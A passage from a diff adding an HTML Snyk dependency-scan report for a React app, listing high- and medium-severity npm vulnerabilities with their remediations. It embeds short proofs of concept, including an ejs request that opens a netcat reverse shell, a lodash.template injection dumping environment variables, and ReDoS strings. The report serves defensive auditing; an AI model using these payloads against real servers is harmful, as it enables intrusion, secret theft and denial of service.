+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            node-forge
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        selfsigned@1.10.14
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        node-forge@0.10.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://github.com/digitalbazaar/forge">node-forge</a> is a JavaScript implementations of network transports, cryptography, ciphers, PKI, message digests, and various utilities.
+        Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to RSA&#39;s <code>PKCS#1</code> v1.5 signature verification code which does not check for tailing garbage bytes after decoding a <code>DigestInfo</code> ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>node-forge</code> to version 1.3.0 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1">GitHub Commit</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-NODEFORGE-2430339">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Command Injection</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            lodash.template
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-webpack-plugin@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-build@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        lodash.template@4.5.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/lodash.template">lodash.template</a> is a The Lodash method _.template exported as a Node.js module.
+        Affected versions of this package are vulnerable to Command Injection via <code>template</code>.</p>
+        <h3 id="poc">PoC</h3>
+        <pre><code class="language-js">var _ = require(&#39;lodash&#39;);
+        
+        _.template(&#39;&#39;, { variable: &#39;){console.log(process.env)}; with(obj&#39; })()
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>There is no fixed version for <code>lodash.template</code>.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c">GitHub Commit</a></li>
+        <li><a href="https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14851">Vulnerable Code</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-LODASHTEMPLATE-1088054">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Prototype Pollution</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            loader-utils
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-dev-utils@11.0.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        loader-utils@2.0.0
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Prototype Pollution in <code>parseQuery</code> function via the name variable in <code>parseQuery.js</code>. This pollutes the prototype of the object returned by <code>parseQuery</code> and not the global Object prototype (which is the commonly understood definition of Prototype Pollution). Therefore, the actual impact will depend on how applications utilize the returned object and how they filter unwanted keys.</p>
+        <h2 id="details">Details</h2>
+        <p>Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the <code>Object.prototype</code> are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.</p>
+        <p>There are two main ways in which the pollution of prototypes occurs:</p>
+        <ul>
+        <li><p>Unsafe <code>Object</code> recursive merge</p>
+        </li>
+        <li><p>Property definition by path</p>
+        </li>
+        </ul>
+        <h3 id="unsafe-object-recursive-merge">Unsafe Object recursive merge</h3>
+        <p>The logic of a vulnerable recursive merge function follows the following high-level model:</p>
+        <pre><code>merge (target, source)
+        
+          foreach property of source
+        
+            if property exists and is an object on both the target and the source
+        
+              merge(target[property], source[property])
+        
+            else
+        
+              target[property] = source[property]
+        </code></pre>
+        <br>  
+        
+        <p>When the source object contains a property named <code>__proto__</code> defined with <code>Object.defineProperty()</code> , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of <code>Object</code> and the source of <code>Object</code> as defined by the attacker. Properties are then copied on the <code>Object</code> prototype.</p>
+        <p>Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: <code>merge({},source)</code>.</p>
+        <p><code>lodash</code> and <code>Hoek</code> are examples of libraries susceptible to recursive merge attacks.</p>
+        <h3 id="property-definition-by-path">Property definition by path</h3>
+        <p>There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: <code>theFunction(object, path, value)</code></p>
+        <p>If the attacker can control the value of “path”, they can set this value to <code>__proto__.myValue</code>. <code>myValue</code> is then assigned to the prototype of the class of the object.</p>
+        <h2 id="types-of-attacks">Types of attacks</h2>
+        <p>There are a few methods by which Prototype Pollution can be manipulated:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Type</th>
+        <th>Origin</th>
+        <th>Short description</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td><strong>Denial of service (DoS)</strong></td>
+        <td>Client</td>
+        <td>This is the most likely attack. <br>DoS occurs when <code>Object</code> holds generic functions that are implicitly called for various operations (for example, <code>toString</code> and <code>valueOf</code>). <br> The attacker pollutes <code>Object.prototype.someattr</code> and alters its state to an unexpected value such as <code>Int</code> or <code>Object</code>. In this case, the code fails and is likely to cause a denial of service.  <br><strong>For example:</strong> if an attacker pollutes <code>Object.prototype.toString</code> by defining it as an integer, if the codebase at any point was reliant on <code>someobject.toString()</code> it would fail.</td>
+        </tr>
+        <tr>
+        <td><strong>Remote Code Execution</strong></td>
+        <td>Client</td>
+        <td>Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br><strong>For example:</strong> <code>eval(someobject.someattr)</code>. In this case, if the attacker pollutes <code>Object.prototype.someattr</code> they are likely to be able to leverage this in order to execute code.</td>
+        </tr>
+        <tr>
+        <td><strong>Property Injection</strong></td>
+        <td>Client</td>
+        <td>The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  <strong>For example:</strong> if a codebase checks privileges for <code>someuser.isAdmin</code>, then when the attacker pollutes <code>Object.prototype.isAdmin</code> and sets it to equal <code>true</code>, they can then achieve admin privileges.</td>
+        </tr>
+        </tbody></table>
+        <h2 id="affected-environments">Affected environments</h2>
+        <p>The following environments are susceptible to a Prototype Pollution attack:</p>
+        <ul>
+        <li><p>Application server</p>
+        </li>
+        <li><p>Web server</p>
+        </li>
+        <li><p>Web browser</p>
+        </li>
+        </ul>
+        <h2 id="how-to-prevent">How to prevent</h2>
+        <ol>
+        <li><p>Freeze the prototype— use <code>Object.freeze (Object.prototype)</code>.</p>
+        </li>
+        <li><p>Require schema validation of JSON input.</p>
+        </li>
+        <li><p>Avoid using unsafe recursive merge functions.</p>
+        </li>
+        <li><p>Consider using objects without prototypes (for example, <code>Object.create(null)</code>), breaking the prototype chain and preventing pollution.</p>
+        </li>
+        <li><p>As a best practice use <code>Map</code> instead of <code>Object</code>.</p>
+        </li>
+        </ol>
+        <h3 id="for-more-information-on-this-vulnerability-type">For more information on this vulnerability type:</h3>
+        <p><a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018</a></p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>loader-utils</code> to version 1.4.1, 2.0.3 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/webpack/loader-utils/commit/a93cf6f4702012030f6b5ee8340d5c95ec1c7d4c">GitHub Commit</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/pull/220/commits/a49c061ef272bc0c61cc1d996f83bb0e3b4daa9e">GitHub Commit</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/212">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/issues/218">GitHub Issue</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/pull/217">GitHub PR</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/releases/tag/v2.0.3">GitHub Release</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/releases/tag/v1.4.1">GitHub Release Notes</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L11">Vulnerable Code</a></li>
+        <li><a href="https://github.com/webpack/loader-utils/blob/d9f4e23cf411d8556f8bac2d3bf05a6e0103b568/lib/parseQuery.js#L47">Vulnerable Code</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-LOADERUTILS-3043105">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Remote Code Execution (RCE)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ejs
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-webpack-plugin@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        workbox-build@5.1.4
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @surma/rollup-plugin-off-main-thread@1.4.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ejs@2.7.4
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.com/package/ejs">ejs</a> is a popular JavaScript templating engine.
+        Affected versions of this package are vulnerable to Remote Code Execution (RCE) by passing an unrestricted render option via the <code>view options</code> parameter of <code>renderFile</code>, which makes it possible to inject code into <code>outputFunctionName</code>.</p>
+        <p><strong>Note:</strong>
+        This vulnerability is exploitable only if the server is already vulnerable to Prototype Pollution.</p>
+        <h2 id="poc">PoC:</h2>
+        <p>Creation of reverse shell:</p>
+        <pre><code>http://localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;nc -e sh 127.0.0.1 1337&#39;);s
+        </code></pre>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ejs</code> to version 3.1.7 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">GitHub Commit</a></li>
+        <li><a href="https://github.com/mde/ejs/issues/451">GitHub Issue</a></li>
+        <li><a href="https://github.com/mde/ejs/releases">GitHub Release</a></li>
+        <li><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">Security Advisory</a></li>
+        <li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2022/CVE-2022-29078.yaml">Nuclei Templates</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-EJS-2803307">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ansi-regex
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        html-webpack-plugin@4.5.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        pretty-error@2.1.2
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        renderkid@2.0.7
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        strip-ansi@3.0.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ansi-regex@2.1.1
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p>Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the sub-patterns<code> [[\\]()#;?]*</code> and <code>(?:;[-a-zA-Z\\d\\/#&amp;.:=?%@~_]*)*</code>.</p>
+        <h3 id="poc">PoC</h3>
+        <pre><code class="language-js">import ansiRegex from &#39;ansi-regex&#39;;
+        
+        for(var i = 1; i &lt;= 50000; i++) {
+            var time = Date.now();
+            var attack_str = &quot;\u001B[&quot;+&quot;;&quot;.repeat(i*10000);
+            ansiRegex().test(attack_str)
+            var time_cost = Date.now() - time;
+            console.log(&quot;attack_str.length: &quot; + attack_str.length + &quot;: &quot; + time_cost+&quot; ms&quot;)
+        }
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ansi-regex</code> to version 3.0.1, 4.1.1, 5.0.1, 6.0.1 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1">GitHub Commit</a></li>
+        <li><a href="https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a">GitHub Commit</a></li>
+        <li><a href="https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9">GitHub Commit</a></li>
+        <li><a href="https://github.com/chalk/ansi-regex/pull/37">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--high" data-snyk-test="high">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--high">
+                    <span class="label__text">high severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            ansi-html
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        @pmmmwh/react-refresh-webpack-plugin@0.4.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ansi-html@0.0.7
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        webpack-dev-server@3.11.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        ansi-html@0.0.7
+                                        
+                                </span>
+        
+                            </li>
+                    </ul><!-- .list-paths -->
+        
+            </div><!-- .card__section -->
+        
+              <hr/>
+              <!-- Overview -->
+              <h2 id="overview">Overview</h2>
+        <p><a href="https://www.npmjs.org/package/ansi-html">ansi-html</a> is an An elegant lib that converts the chalked (ANSI) text to HTML.
+        Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). If an attacker provides a malicious string, it will get stuck processing the input for an extremely long time.</p>
+        <h3 id="poc">PoC</h3>
+        <pre><code>require(&#39;ansi-html&#39;)(&#39;x1b[0mx1b[&#39; + &#39;0&#39;.repeat(35))
+        </code></pre>
+        <h2 id="details">Details</h2>
+        <p>Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.</p>
+        <p>The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren&#39;t very intuitive and can ultimately end up making it easy for attackers to take your site down.</p>
+        <p>Let’s take the following regular expression as an example:</p>
+        <pre><code class="language-js">regex = /A(B|C+)+D/
+        </code></pre>
+        <p>This regular expression accomplishes the following:</p>
+        <ul>
+        <li><code>A</code> The string must start with the letter &#39;A&#39;</li>
+        <li><code>(B|C+)+</code> The string must then follow the letter A with either the letter &#39;B&#39; or some number of occurrences of the letter &#39;C&#39; (the <code>+</code> matches one or more times). The <code>+</code> at the end of this section states that we can look for one or more matches of this section.</li>
+        <li><code>D</code> Finally, we ensure this section of the string ends with a &#39;D&#39;</li>
+        </ul>
+        <p>The expression would match inputs such as <code>ABBD</code>, <code>ABCCCCD</code>, <code>ABCBCCCD</code> and <code>ACCCCCD</code></p>
+        <p>It most cases, it doesn&#39;t take very long for a regex engine to find a match:</p>
+        <pre><code class="language-bash">$ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD&quot;)&#39;
+        0.04s user 0.01s system 95% cpu 0.052 total
+        
+        $ time node -e &#39;/A(B|C+)+D/.test(&quot;ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX&quot;)&#39;
+        1.79s user 0.02s system 99% cpu 1.812 total
+        </code></pre>
+        <p>The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.</p>
+        <p>Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as <em>catastrophic backtracking</em>.</p>
+        <p>Let&#39;s look at how our expression runs into this problem, using a shorter string: &quot;ACCCX&quot;. While it seems fairly straightforward, there are still four different ways that the engine could match those three C&#39;s:</p>
+        <ol>
+        <li>CCC</li>
+        <li>CC+C</li>
+        <li>C+CC</li>
+        <li>C+C+C.</li>
+        </ol>
+        <p>The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use <a href="https://regex101.com/debugger">RegEx 101 debugger</a> to see the engine has to take a total of 38 steps before it can determine the string doesn&#39;t match.</p>
+        <p>From there, the number of steps the engine must use to validate a string just continues to grow.</p>
+        <table>
+        <thead>
+        <tr>
+        <th>String</th>
+        <th align="right">Number of C&#39;s</th>
+        <th align="right">Number of steps</th>
+        </tr>
+        </thead>
+        <tbody><tr>
+        <td>ACCCX</td>
+        <td align="right">3</td>
+        <td align="right">38</td>
+        </tr>
+        <tr>
+        <td>ACCCCX</td>
+        <td align="right">4</td>
+        <td align="right">71</td>
+        </tr>
+        <tr>
+        <td>ACCCCCX</td>
+        <td align="right">5</td>
+        <td align="right">136</td>
+        </tr>
+        <tr>
+        <td>ACCCCCCCCCCCCCCX</td>
+        <td align="right">14</td>
+        <td align="right">65,553</td>
+        </tr>
+        </tbody></table>
+        <p>By the time the string includes 14 C&#39;s, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.</p>
+        <h2 id="remediation">Remediation</h2>
+        <p>Upgrade <code>ansi-html</code> to version 0.0.9 or higher.</p>
+        <h2 id="references">References</h2>
+        <ul>
+        <li><a href="https://github.com/Tjatse/ansi-html/issues/19">GitHub Issue</a></li>
+        <li><a href="https://github.com/Tjatse/ansi-html/pull/20">GitHub PR</a></li>
+        </ul>
+        
+              <hr/>
+        
+            <div class="cta card__cta">
+                <p><a href="https://snyk.io/vuln/SNYK-JS-ANSIHTML-1296849">More about this vulnerability</a></p>
+            </div>
+        
+        </div><!-- .card -->
+        <div class="card card--vuln  disclosure--not-new severity--medium" data-snyk-test="medium">
+            <h2 class="card__title">Regular Expression Denial of Service (ReDoS)</h2>
+            <div class="card__section">
+        
+                <div class="label label--medium">
+                    <span class="label__text">medium severity</span>
+                </div>
+        
+                <hr/>
+        
+                <ul class="card__meta">
+                    <li class="card__meta__item">
+                        Package Manager: npm
+                    </li>
+                    <li class="card__meta__item">
+                            Vulnerable module:
+        
+                            word-wrap
+                    </li>
+        
+                    <li class="card__meta__item">Introduced through:
+        
+        
+                                    my-app@0.1.0, react-scripts@4.0.3 and others
+                    </li>
+                </ul>
+        
+                <hr/>
+        
+        
+                        <h3 class="card__section__title">Detailed paths</h3>
+        
+                    <ul class="card__meta__paths">
+                                <li>
+                                <span class="list-paths__item__introduced"><em>Introduced through</em>:
+                                        my-app@0.1.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        react-scripts@4.0.3
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        eslint@7.32.0
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        optionator@0.9.1
+                                         <span class="list-paths__item__arrow">›</span> 
+                                        word-wrap@1.2.3
+                                        
+                                </span>
+        
+                            </li>
+                                <li>
